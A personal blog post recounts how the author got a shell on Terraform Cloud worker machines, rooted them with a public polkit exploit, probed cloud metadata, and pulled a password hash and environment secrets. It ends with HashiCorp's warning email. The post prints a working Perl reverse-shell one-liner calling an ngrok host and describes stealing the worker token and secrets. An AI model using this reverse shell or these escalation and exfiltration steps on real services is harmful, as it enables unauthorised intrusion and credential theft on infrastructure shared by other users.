# Intro

I am a big fan of Terraform and more recently Terraform Enterprise (TFE). TFE now offers free accounts for hobbiest which I use now to manage my personal projects with infra. Using a remote TFE workspace comes with many benefits but one of the best is state management and CI/CD. Simply connect your repo to TFE and commit to main. After than you terraform deployment runs on and is managed in the TFE workspace. 

Which got me thinking, I am running code on another persons machine....

I am writing the blog now but I explored this in Feb so some details might be fuzzy.

## The starting mischief 

Okay so we can run code on another machine but the real question is where does that get us? 

So I started thinking a way I can get a shell to explore on the Hasicorp TFE workers. There is a great blog by Alxk 
https://alex.kaskaso.li/post/terraform-plan-rce which goes over several methods you can execute code at various stagings in TF. 

The easiest and most simple way is to use an external provider and run bash. For some reason at the time I used a perl payload. If I rmember correctly it was became it worked out the box with little debugging on the remote host...sorry lol.

To make things easy I used ngrok to proxy the connection back to my local host. If you worried about opsec please do not do this. 

```bash
#!/bin/sh

perl -e 'use Socket;$i="4.tcp.ngrok.io";$p=19960;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

## Poking around

Once on the host we are running as user Terraform on Ubuntu 18.04 ... a little outdated if you ask me HashiCorp

We all love lazy hacking so one of the first things I did was check the sudo version. This at this time PolKit had only been out for few day (weeks?) and I see version `Sudo version 1.8.21p2`. Easy work, finding a quick public exploit on github and we have root.

Once with root I start poking around the host for any type of configuration files or credentials that might be useful for escalation but had no luck. At this point it is getting late in the night so I decide to call it and go to bed.

## Cross Persistance? 

My main question was, can I access other users runs? 

Without knowing exactly how the system works, there are some assumptions to be made. We know the hosts are ephemeral, hitting the AWS metadata api indicates we are running on a t3a.small so we are on a temporary EC2 instance. A question here to explore would have been are instances reused as all. Can I persist?

To test I adding a shell to run on a cron on an instance and waited for it to call back but it never did. This might indicate that instances are delete and not shared between runs. Otherwise it might have be possible to gain access to another users TF run. 

## Finding the Terraform user hash

Using the escalated root access I was able to recover the terraform users hash. After check several instances it was clear the all runners share the same user hash in /etc/shadowd, I didn't try to crack it. While this is a cool find, there is no networking between hosts or externally so the user has is not useful in this case. I still reported it to HashiCorp. 

## Environment Variables 

This is not really an exploit but a behavior of TFE. If you add workspace secrets in each TFE run the secrets will be amiable in the ENVs. This also goes for secrets "shared" with a workspace but might not be in use. This could be useful for exfil in the future if you are able to run TF code. 

Another interesting note is that all workers authenticate to the workspace using an ATLAS_TOKEN, stealing this token will give you temporary access to the workspace. I did not explore exactly what permissions this token had because I was asked by Hashicorp to stop...

## Getting Caught 

To be clean I was doing all this testing in my own environment in an isolated account with good intentions. That being said I was still aware this was likely against the terms and services. I do not recommend, in all cases doing unauthorize testing against a service is bad. 

After calling it a night I woke up to a polite email form Hashicorp, seriously shout out to them for being so cool. 

```bash
Hi there!

We noticed that you are interested in our Terraform Cloud worker configuration and saw that you were active late last night / this morning.

Organization Name: ruse

Workspace Name: testing

While not an exposure within the context of our security model, the type of activity that we observed in your account (specifically, escalating access on an isolated worker using the recent polkit vulnerability) violates the Terms of Use for Terraform Cloud. Normally this would result in a suspension of your Terraform organization and account, but we wanted to reach out, and see if you would be interested in chatting more about Terraform Cloud. We also ask that you refrain from seeking access to AWS metadata, exploiting CVE-2021-4034, etc. and, instead, invite you to have a chat.

Looking forward to hearing back from you.

Best,

HashiCorp Security

P.S. We are also hiring (https://www.hashicorp.com/jobs/security) in case you are interested in taking your security knowledge and applying it more directly to our products as part of the HashiCorp team :).
```

I was able to meet with their security team and walk through what I was trying and possible attack paths. The security team was very nice and shared some of the system design decisions already take to mitigate those attack paths. 


At the end of the day no real vulns (a good thing) came from this exploration but it was fun at the very least. 